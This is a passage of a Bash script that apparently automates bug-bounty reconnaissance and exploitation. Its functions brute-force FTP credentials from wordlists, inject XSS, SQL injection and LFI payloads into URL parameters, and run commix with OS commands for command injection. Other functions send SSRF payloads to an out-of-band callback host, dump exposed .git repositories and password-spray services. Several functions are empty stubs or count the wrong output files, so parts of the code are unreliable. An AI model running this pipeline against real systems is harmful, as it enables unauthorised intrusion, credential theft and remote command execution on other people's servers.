	subzy run --timeout $SUBZY_TIMEOUT --concurrency $SUBZY_CONCURRENCY --hide_fails --targets ${SUBDOMAINDIR}/alivesubs.txt 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null | sed -e 's/\x1b\[[0-9;]*m//g' | egrep -av "\[NOT VULNERABLE\]" | unew -el -q ${ROOT_VULNDIR}/subzy.takeover

	STOP_SPINNER
	echo -e "${BGREEN}[+] SUBZY${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/subzy.takeover || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

NUCLEI(){
	START_SPINNER "${BGREEN}NUCLEI${RESET}"

	cat ${SUBDOMAINDIR}/alivesubs.txt | nuclei -duc -silent -nc -nh -tags takeover -severity info,low,medium,high,critical -retries $NUCLEI_RETRIES -rl $NUCLEI_RATELIMIT -t templates/takeovers | unew -el -t -q ${ROOT_VULNDIR}/nuclei.takeover

	STOP_SPINNER
	echo -e "${BGREEN}[+] NUCLEI${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/nuclei.takeover || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# MX Takeover
MXTAKEOVER(){
	START_SPINNER "${BGREEN}MXTAKEOVER${RESET}"

	cat ${SUBDOMAINDIR}/alivesubs.txt | mx-takeover -check-whois -w 20 -output ${ROOT_VULNDIR}/mxtakeover.json &>/dev/null

	STOP_SPINNER
	echo -e "${BGREEN}[+] MXTAKEOVER${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/mxtakeover.takeover || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# DNS takeover
DNSTAKE(){
	START_SPINNER "${BGREEN}DNSTAKE${RESET}"

	cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | dnstake --silent --concurrent 25 | unew -el -t -q ${ROOT_VULNDIR}/dnstake.takeover

	STOP_SPINNER
	echo -e "${BGREEN}[+] DNSTAKE${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/dnstake.takeover || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# Zone Transfer
DIG(){
	START_SPINNER "${BGREEN}DIG${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] DIG${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/dig.takeover || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Vulnerability Scanning
FTP(){
	START_SPINNER "${BGREEN}FTP${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/naabu.txt | grep -a ":21$" | unew -el -i -t -q ${VULNDIR}/ftp-urls.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "$VULNDIR/ftp-urls.txt" ]; then
        echo -e "${BRED}[x] FTP${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	cat ${VULNDIR}/ftp-urls.txt | interlace --silent -threads 10 -c "ftpx -mode upc -ip _target_ -wordlist wordlists/ftp-username-password.txt > _output_/_cleantarget_.txt" -o ${FTPDIR}
	cat ${FTPDIR}/*.txt 2>/dev/null | unew -el -t -q ${VULNDIR}/ftp.txt

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/ftp.txt" ] && [ $(wc -l < "${VULNDIR}/ftp.txt") -gt 0 ]; then
	    cp "${VULNDIR}/ftp.txt" "${ROOT_VULNDIR}/ftp.txt"
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] FTP${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/ftp.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SSH(){
	START_SPINNER "${BGREEN}SSH${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/naabu.txt | grep -a ":22$" | unew -el -i -t -q ${VULNDIR}/ssh-urls.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "$VULNDIR/ssh-urls.txt" ]; then
        echo -e "${BRED}[x] SSH${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	# cat ${VULNDIR}/ssh-urls.txt | interlace --silent -threads 10 -c "sshx -mode upc -ip _target_ -wordlist wordlists/ftp-username-password.txt > _output_/_cleantarget_.txt" -o ${FTP}

	# ssb -w wordlists/wordlist.txt -p 22 -t 1m -c 1000 -r 1 root@localhost

	STOP_SPINNER
	echo -e "${BGREEN}[+] SSH${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/ssh.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

S3SCANNER(){
	START_SPINNER "${BGREEN}S3SCANNER${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/naabu.txt | s3scanner -bucket-file names.txt -enumerate | unew -el -t -q ${VULNDIR}/s3scanner.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] S3SCANNER${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/ssh.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

VULNTECHX(){
	START_SPINNER "${BGREEN}VULNTECHX${RESET}"

	if [ "$VULNTECHX_SCAN_MODE" = "NORMAL" ]; then
		cat ${ROOT_SUBDOMAINDIR}/httpx.txt | httpx -duc -silent -nc -td -t ${HTTPX_THREADS} | unew -el -i -t -q ${URLSDIR}/vulntechx_httpx.txt
	fi

	if [ "$VULNTECHX_SCAN_MODE" = "ADVANCED" ]; then
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-4 | unew -el -i -t -q ${URLSDIR}/vulntechx_dir.txt
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-5 | unew -el -i -t -q ${URLSDIR}/vulntechx_dir.txt
		cat ${ROOT_URLSDIR}/allurls.txt | cut -d"/" -f1-6 | unew -el -i -t -q ${URLSDIR}/vulntechx_dir.txt

		cat ${URLSDIR}/vulntechx_dir.txt | egrep -av '\?|=|/[0-9]' | grep -aEv '(-.*){2}' | awk -F/ '{if (index($NF, ".") == 0) print $0}' | awk -F/ '{if (length($NF) <= 15) print $0}' | sed 's/\(\/\|\/__\|\/_\)\s*$//' | awk -F'/' 'NF > 3' | unew -el -i -t -q ${URLSDIR}/vulntechx_dir_filter.txt
		cat ${URLSDIR}/vulntechx_dir_filter.txt | httpx -duc -silent -nc -td -t ${HTTPX_THREADS} | unew -el -i -t -q ${URLSDIR}/vulntechx_httpx.txt
	fi

	# Common steps for both conditions
	cat ${URLSDIR}/vulntechx_httpx.txt | vulntechx httpxjson -o ${VULNDIR}/httpxjson-output.json &>/dev/null
	vulntechx nuclei --file ${VULNDIR}/httpxjson-output.json --nucleicmd "nuclei -duc -nc -silent -tc {tech} -es ${VULNTECHX_NUCLEI_EXCLUDE_SEVERITY}" --process --parallel ${VULNTECHX_PARALLEL} --exclude-tech ${VULNTECHX_EXCLUDE_TECH} --append-output ${VULNDIR}/vulntechx.txt &>/dev/null

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/vulntechx.txt" ] && [ $(wc -l < "${VULNDIR}/vulntechx.txt") -gt 0 ]; then
	    cp "${VULNDIR}/vulntechx.txt" "${ROOT_VULNDIR}/vulntechx.txt"
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] VULNTECHX${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/vulntechx.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

XSS(){
	START_SPINNER "${BGREEN}XSS${RESET}"

	if grep -qv "^rix4uni" "${XSS_WORDLIST}"; then
	  sed -i 's/^/rix4uni/' "${XSS_WORDLIST}"
	fi

	if [ "$XSS_SCAN_MODE" = "NORMAL" ]; then
		if [ "$USE_GFPATTERNS" = "TRUE" ]; then
			cat ${URLSDIR}/filteredurls.txt | gf xss | unew -el -t -q ${URLSDIR}/gf_xss.txt
			cat ${URLSDIR}/gf_xss.txt | pvreplace -silent -payload ${XSS_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/xss_pvreplace.txt
		else
			# if USE_GFPATTERNS is FALSE then scan all parameters
			cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload ${XSS_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/xss_pvreplace.txt
		fi

		# Common steps for both TRUE and FALSE conditions
		cat ${VULNDIR}/xss_pvreplace.txt | xsschecker -nc -match 'rix4uni' -vuln -t ${XSSCHECKER_THREADS} -timeout ${XSSCHECKER_TIMEOUT} -retries ${XSSCHECKER_RETRIES} 2>/dev/null | sed 's/^Vulnerable: \[[^]]*\] \[[^]]*\] //' | unew -el -t -q ${VULNDIR}/xsschecker.txt
	fi

	if [ "$XSS_SCAN_MODE" = "ADVANCED" ]; then
		if [ "$USE_GFPATTERNS" = "TRUE" ]; then
			cat ${URLSDIR}/filteredurls.txt | gf xss | unew -el -t -q ${URLSDIR}/gf_xss.txt
			cat ${URLSDIR}/gf_xss.txt | pvreplace -silent -payload ${XSS_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/xss_pvreplace.txt
		else
			# if USE_GFPATTERNS is FALSE then scan all parameters
			cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload ${XSS_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/xss_pvreplace.txt
		fi

		# Common steps for both TRUE and FALSE conditions
		cat ${VULNDIR}/xss_pvreplace.txt | xsschecker -nc -match 'rix4uni' -vuln -t ${XSSCHECKER_THREADS} -timeout ${XSSCHECKER_TIMEOUT} -retries ${XSSCHECKER_RETRIES} 2>/dev/null | sed 's/^Vulnerable: \[[^]]*\] \[[^]]*\] //' | unew -el -t -q ${VULNDIR}/xsschecker.txt

		# Checks XSS False Positive
		cat ${VULNDIR}/xsschecker.txt | unew -q -split ${XSSCHECKER_SPLIT} ${VULNDIR}/xsschecker_split.txt
		parallel --ungroup -j${PYXSS_PARALLEL_FILE_SCAN} "cat {} | pyxss --silent --no-color -o {= s:xsschecker_split:xss: =}" ::: ${VULNDIR}/xsschecker_split*.txt &>/dev/null
		cat ${VULNDIR}/xss[0-9]*.txt | egrep -av 'NOT VULNERABLE:' | unew -el -ef -q ${ROOT_VULNDIR}/xss.txt
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] XSS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/xss.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ERRORBASEDSQLI(){
	START_SPINNER "${BGREEN}ERRORBASEDSQLI${RESET}"

	if [ "$USE_GFPATTERNS" = "TRUE" ]; then
		cat ${URLSDIR}/filteredurls.txt | gf sqli | unew -el -t -q ${URLSDIR}/gf_sqli.txt
		cat ${URLSDIR}/gf_sqli.txt | nuclei -duc -silent -nc -dast -t templates/error-based-sqli.yaml 2>/dev/null | unew -el -t -q ${VULNDIR}/errorbasedsqli.txt
	else
		# if USE_GFPATTERNS is FALSE then scan all parameters
		cat ${URLSDIR}/filteredurls.txt | nuclei -duc -silent -nc -dast -t templates/error-based-sqli.yaml 2>/dev/null | unew -el -t -q ${VULNDIR}/errorbasedsqli.txt
	fi

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/errorbasedsqli.txt" ] && [ $(wc -l < "${VULNDIR}/errorbasedsqli.txt") -gt 0 ]; then
	    cp "${VULNDIR}/errorbasedsqli.txt" "${ROOT_VULNDIR}/errorbasedsqli.txt"
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] ERRORBASEDSQLI${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/errorbasedsqli.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

TIMEBASEDSQLI(){
	START_SPINNER "${BGREEN}TIMEBASEDSQLI${RESET}"

	if [ "$USE_GFPATTERNS" = "TRUE" ]; then
		cat ${URLSDIR}/filteredurls.txt | gf sqli | unew -el -t -q ${URLSDIR}/gf_sqli.txt
		cat ${URLSDIR}/gf_sqli.txt | pvreplace -silent -payload "*" -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -t -q ${VULNDIR}/sqli_pvreplace.txt
	else
		# if USE_GFPATTERNS is FALSE then scan all parameters
		cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload "*" -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -t -q ${VULNDIR}/sqli_pvreplace.txt
	fi

	# Common steps for both TRUE and FALSE conditions
	gosqli -list ${VULNDIR}/sqli_pvreplace.txt -payload ${SQLI_WORDLIST} | tee -a ${VULNDIR}/sqli.txt

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/sqli.txt" ] && [ $(wc -l < "${VULNDIR}/sqli.txt") -gt 0 ]; then
		cat ${VULNDIR}/sqli.txt | grep -a "SQLI CONFIRMED:" | unew -el -t -q ${VULNDIR}/validsqli.txt
	    cp "${VULNDIR}/validsqli.txt" "${ROOT_VULNDIR}/validsqli.txt"
	fi

	# ghauri
	# sqlmap

	STOP_SPINNER
	echo -e "${BGREEN}[+] TIMEBASEDSQLI${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/validsqli.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

LFI(){
	START_SPINNER "${BGREEN}LFI${RESET}"

	# LINUX LFI
	if [ "$USE_GFPATTERNS" = "TRUE" ]; then
		cat ${URLSDIR}/filteredurls.txt | gf lfi | unew -el -t -q ${URLSDIR}/gf_lfi.txt
		cat ${URLSDIR}/gf_lfi.txt | pvreplace -silent -payload ${LFI_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/lfi_pvreplace.txt
	else
		# if USE_GFPATTERNS is FALSE then scan all parameters	
		cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload ${LFI_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/lfi_pvreplace.txt
	fi

	# Common steps for both TRUE and FALSE conditions
	ffuf -v -u FUZZ -w ${VULNDIR}/lfi_pvreplace.txt -t 40 -rate 1000 -mr "root:[x*]:0:0" 2>/dev/null | unew -el -t -q ${VULNDIR}/ffuf_lfi.txt
	cat ${VULNDIR}/ffuf_lfi.txt | grep -a "| URL |" | sed 's/| URL | //' | unew -el -q ${VULNDIR}/lfi.txt

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/lfi.txt" ] && [ $(wc -l < "${VULNDIR}/lfi.txt") -gt 0 ]; then
	    cp "${VULNDIR}/lfi.txt" "${ROOT_VULNDIR}/lfi.txt"
	fi

	# WINDOWS LFI

	STOP_SPINNER
	echo -e "${BGREEN}[+] LFI${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/lfi.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

RCE(){
	START_SPINNER "${BGREEN}RCE${RESET}"

	if [ "$USE_GFPATTERNS" = "TRUE" ]; then
		cat ${URLSDIR}/filteredurls.txt | gf rce | unew -el -t -q ${URLSDIR}/gf_rce.txt
		cat ${URLSDIR}/gf_rce.txt | pvreplace -silent -payload id -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/rce_pvreplace.txt
	else
		# if USE_GFPATTERNS is FALSE then scan all parameters
		cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload id -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -el -t -q ${VULNDIR}/rce_pvreplace.txt
	fi

	# Common steps for both TRUE and FALSE conditions
	ffuf -s -u FUZZ -w ${VULNDIR}/rce_pvreplace.txt -mr "uid=\d+\(\w+-?\w*\) gid=\d+\(\w+-?\w*\) groups=\d+\(\w+-?\w*\)" | unew -el -t -q ${VULNDIR}/rce_ffuf.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "${VULNDIR}/rce_ffuf.txt" ]; then
        echo -e "${BRED}[x] RCE${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	# commix
	interlace --silent -tL ${URLSDIR}/filteredurls.txt -threads 1 -c "timelimitx -t ${COMMIX_TIMELIMITX} commix --batch -u \"_target_\" --output-dir vuln --os-cmd=\"id; ls; pwd\""

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/rce.txt" ] && [ $(wc -l < "${VULNDIR}/rce.txt") -gt 0 ]; then
	    cp "${VULNDIR}/rce.txt" "${ROOT_VULNDIR}/rce.txt"
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] RCE${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/rce.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SSTI(){
	# I will write later
	START_SPINNER "${BGREEN}RCE${RESET}"
	STOP_SPINNER
}

SSRF(){
	cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload "http://sfsh.oastify.com" -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -t -q ${VULNDIR}/ssrf_pvreplace.txt
	cat ${VULNDIR}/ssrf_pvreplace.txt | httpx -duc -silent -nc -fr | unew -ef -el -t -q ${VULNDIR}/ssrf.txt
}

OPEN_REDIRECT(){
	START_SPINNER "${BGREEN}OPEN_REDIRECT${RESET}"

	if [ "$USE_GFPATTERNS" = "TRUE" ]; then
		cat ${URLSDIR}/filteredurls.txt | gf redirect | pvreplace -silent -payload ${OPEN_REDIRECT_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -q ${VULNDIR}/open_redirect_pvreplace.txt
	else
		# if USE_GFPATTERNS is FALSE then scan all parameters
		cat ${URLSDIR}/filteredurls.txt | pvreplace -silent -payload ${OPEN_REDIRECT_WORDLIST} -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -q ${VULNDIR}/open_redirect_pvreplace.txt
	fi

	# Common steps for both TRUE and FALSE conditions
	cat ${VULNDIR}/open_redirect_pvreplace.txt | httpx -duc -silent -mc 301,302,303,307,308 | unew -ef -el -q ${ROOT_VULNDIR}/open_redirect.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] OPEN_REDIRECT${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/open_redirect.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

DOTGIT(){
	START_SPINNER "${BGREEN}DOTGIT${RESET}"

	cat ${SUBDOMAINDIR}/alivesubs.txt | sed 's#$#/.git/config#g' | unew -el -t -q ${DOTGITDIR}/dotgit_subs.txt
	ffuf -s -u FUZZ -w ${DOTGITDIR}/dotgit_subs.txt -mr "\[core\]" | unew -el -t -q ${DOTGITDIR}/ffuf_dotgit.txt
	sed 's#/\.git/config$##' -i ${DOTGITDIR}/ffuf_dotgit.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "${DOTGITDIR}/ffuf_dotgit.txt" ]; then
        echo -e "${BRED}[x] DOTGIT${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	cat ${DOTGITDIR}/ffuf_dotgit.txt | interlace --silent -threads 1 -c "goop _target_ dotgit/goop/_cleantarget_" 2>/dev/null

	# gitrepoenum commit -i dotgit/goop -d all -o dotgit/commits
	# gitrepoenum code -i dotgit/goop -o dotgit/commits
	# gitrepoenum vuln -i dotgit/commits -o dotgit/commits

	# git -C acc.net/ --no-pager log --pretty=format:%H | xargs -I{} git -C acc.net/ --no-pager show {} | tee -a git-command-logs.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] DOTGIT${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/dotgit.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

PDFTOTEXT(){
	START_SPINNER "${BGREEN}PDFTOTEXT${RESET}"

	# Check if the file exists and has 0 lines
    if [ ! -s "${ROOT_URLSDIR}/allurls.txt" ]; then
        echo -e "${BRED}[x] PDFTOTEXT${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	cat ${ROOT_URLSDIR}/allurls.txt | grep -a "\.pdf$" | interlace --silent -threads 10 -c "curl -s _target_ | pdftotext - _output_/_cleantarget_.txt 2>/dev/null" -o ${PDFTOTEXTDIR} 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null
	find ${PDFTOTEXTDIR} -type f -print0 | xargs --null grep -a -Z -L -Eai 'internal use only|confidential' | xargs --null rm -rf

	STOP_SPINNER
	echo -e "${BGREEN}[+] PDFTOTEXT${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/pdftotext.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSLEAKS(){
	START_SPINNER "${BGREEN}JSLEAKS${RESET}"

	cat urls.txt | egrep -av "\.json" | grep -a "\.js" | linkinspector -silent -nc -mt "application/javascript" | awk '{print $1}' | unew -el -t -q js-links.txt
	cat js-links.txt | nuclei -duc -silent -nc -t ~/nuclei-templates/exposures/ | unew js-leaks.txt
	trufflehog
	secretfinder
	mantra

	STOP_SPINNER
	echo -e "${BGREEN}[+] JSLEAKS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/jsleaks.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

JSONLEAKS(){
	START_SPINNER "${BGREEN}JSONLEAKS${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] JSONLEAKS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/jsonleaks.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GITHUBLEAKS(){
	START_SPINNER "${BGREEN}GITHUBLEAKS${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] GITHUBLEAKS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/githubleaks.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

IIS(){
	START_SPINNER "${BGREEN}IIS${RESET}"

	if [ "$IIS_SCAN_MODE" = "NORMAL" ]; then
		cat ${ROOT_SUBDOMAINDIR}/httpx.txt | grep -aE "IIS|IIS Windows Server|Microsoft-IIS|Windows Server" | awk '{print $1}' | unew -el -t -q ${VULNDIR}/iis.txt
	fi

	if [ "$IIS_SCAN_MODE" = "ADVANCED" ]; then
		# Check if the file exists and has 0 lines
	    if [ ! -s "${ROOT_URLSDIR}/httpx.txt" ]; then
	    	cat ${ROOT_URLSDIR}/allurls.txt | httpx -duc -silent -nc -td -t ${HTTPX_THREADS} | unew -el -t -q ${ROOT_URLSDIR}/httpx.txt
	    fi

		cat ${ROOT_URLSDIR}/httpx.txt | grep -aE "IIS|IIS Windows Server|Microsoft-IIS|Windows Server" | awk '{print $1}' | unew -el -t -q ${VULNDIR}/iis.txt
	fi

	# Check if the file exists and has 0 lines
    if [ ! -s "$VULNDIR/iis.txt" ]; then
        echo -e "${BRED}[x] IIS${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

    # Run the commands if the file has content
	cat ${VULNDIR}/iis.txt | interlace --silent -threads 10 -c "shortscan _target_ -F -s -p 1 > _output_/_cleantarget_.txt" -o ${IISIDR} 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null
	find ${IISIDR}/*.txt -type f -print0 | xargs --null grep -a -Z -L 'Vulnerable: Yes' | xargs --null rm -rf

	STOP_SPINNER
	echo -e "${BGREEN}[+] IIS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/iis.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

SWAGGERUI(){
	START_SPINNER "${BGREEN}SWAGGERUI${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/httpx.txt | grep -aE "Swagger UI" | awk '{print $1}' | unew -el -t -q ${VULNDIR}/swaggerui.txt
	cat ${VULNDIR}/swaggerui.txt | nuclei -duc -silent -nc -t templates/swagger-ui-xss.yaml | sed -e 's/^\[swagger-ui-xss\] \[http\] \[medium\] //' -e 's/ \[ENDPOINT=.*$//' | unew -el -t -q ${VULNDIR}/swaggerui_nuclei.txt

	# False Positive Checking
	cat ${VULNDIR}/swaggerui_nuclei.txt | pyxss --silent --no-color -o ${VULNDIR}/swaggerui_xss.txt &>/dev/null

	# Check if the file has more than 0 lines
	if [ -f "${VULNDIR}/swaggerui_xss.txt" ] && [ $(wc -l < "${VULNDIR}/swaggerui_xss.txt") -gt 0 ]; then
		cat ${VULNDIR}/swaggerui_xss.txt | egrep -av "NOT VULNERABLE:" | unew -el -t -q ${VULNDIR}/swaggerui_xss.txt
	    cp "${VULNDIR}/swaggerui_xss.txt" "${ROOT_VULNDIR}/swaggerui_xss.txt"
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] SWAGGERUI${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/swaggerui_xss.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

403_401_BYPASS(){
	START_SPINNER "${BGREEN}403_401_BYPASS${RESET}"

	STOP_SPINNER
	echo -e "${BGREEN}[+] 403_401_BYPASS${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/403_401_bypass.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# URLs Secrets
LINKINSPECTOR(){
	START_SPINNER "${BGREEN}LINKINSPECTOR${RESET}"

	cat urls.txt | linkinspector -silent -nc -append-output linkinspector.txt

	# Domain Backup Fuzz
	cat ${ROOT_SUBDOMAINDIR}/httpx.txt | awk -F' ' '{ if ($2 == "[403]" || $2 == "[404]" || $2 == "[302]") print $1 }' | unew -el -t -q notaccessible_subs.txt
	cat notaccessible_subs.txt | fuzzuli -sl -mt shuffle -jw | unew -el -t -q fuzzuli.txt
	cat fuzzuli.txt | linkinspector -silent -nc -mc 200,302 -append-output fuzzuli_linkinspector.txt


	cat notaccessible_subs.txt | wordgen -silent -path wordlists/words.txt -e ".rar, .zip, .tar.gz, .tar, .gz, .jar, .7z, .bz2, .sql, .backup, .war" | unew -el -t -q wordgen.txt
	cat wordgen.txt | linkinspector -silent -nc -mc 200,302 -append-output fuzzuli_linkinspector.txt

	cat notaccessible_subs.txt | interlace --silent -threads ${INTERLACE_THREADS} -c "ffuf -s -u _target_/FUZZ -w wordlists/onelistforallshort.txt -mc ${FFUFDIRENUM_STATUS_MATCH} -o _output_/_cleantarget_.json" -o ${SUBDOMAINDIR}/ffufdirenum

	STOP_SPINNER
	echo -e "${BGREEN}[+] LINKINSPECTOR${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/linkinspector.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Password spraying
BRUTESPRAY(){
	START_SPINNER "${BGREEN}BRUTESPRAY${RESET}"

	python3 brutespray.py --file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt --threads 5 --hosts 5
	brutespray -f $dir/hosts/portscan_active.gnmap -T $BRUTESPRAY_CONCURRENCE -o $dir/vulns/brutespray 2>>"$ERRORLOGFILE" >/dev/null

	STOP_SPINNER
	echo -e "${BGREEN}[+] BRUTESPRAY${RESET}: $(wc -l 2>/dev/null < ${ROOT_VULNDIR}/brutespray.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Delete TMPDIR files
DELETE_TMPDIR(){
	START_SPINNER "${BGREEN}DELETE_TMPDIR${RESET}"

	# if DELETE_TMPDIR is TRUE then delete large files
	if [ "$DELETE_TMPDIR" = "TRUE" ]; then
		rm -rf ${SUBDOMAINDIR}/altdns.subs
		rm -rf ${SUBDOMAINDIR}/puredns.subs
		rm -rf ${SUBDOMAINDIR}/alterx.subs
		rm -rf ${SUBDOMAINDIR}/gotator.subs
		rm -rf ${SUBDOMAINDIR}/dnsgen.subs
		rm -rf ${SUBDOMAINDIR}/goaltdns.subs
		rm -rf ${SUBDOMAINDIR}/ripgen.subs
		rm -rf ${SUBDOMAINDIR}/dnscewl.subs
		rm -rf ${SUBDOMAINDIR}/allpermutationssubs.txt
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] DELETE_TMPDIR${RESET}: ${TIME} seconds"
}


RECON(){
	# Subdomain Enumeration
	run "BUGBOUNTYDATA"
	run "SUBFINDER"
	run "AMASS"
	run "SUBDOG"
	run "FINDOMAIN"
	run "CHAOS"
	run "GITHUB_SUBDOMAINS"
	# run "BBOT"
	run "ONEFORALL"
	run "SHOSUBGO"
	run "ASSETFINDER"
	run "HAKTRAILS"
	# run "HAKTRAILSFREE"


	# Certificate Transperency
	run "CERO"
	run "CERTINFO"
	run "CSPRECON"
	run "CSPFINDER"
	run "ALLSUBDOMAIN"
	# run "RECURSIVESUBENUM"


	# Subdomain Permutations
	# run "ALTDNS"
	# run "PUREDNS"
	# run "ALTERX"
	# run "GOTATOR"
	# run "DNSGEN"
	# run "GOALTDNS"
	# run "RIPGEN"
	# run "DNSCEWL"
	# run "ALLSUBDOMAINPERMUTATIONS"


	# Subdomain Resolving
	# run "PUREDNS"
	# run "SHUFFLEDNS"
	# run "MASSDNS"


	# Subdomain DNS Enumeration
	# run "DNSX"


	# Cloud Recon
	run "KAEFERJAEGER"


	# Port Scanning
	run "NAABU"
	# run "MASSCAN"
	# run "RUSTSCAN"
	# run "NMAP"


	# Subdomain Probing
	run "HTTPX"


	# Subdomain Bruteforcing
	# run "FFUFBRUTE"


	# VHOST Dicovery
	# run "FFUFVHOST"


	# Favicon Lookup
	run "FAVINFO"
	run "FAVIRECON"


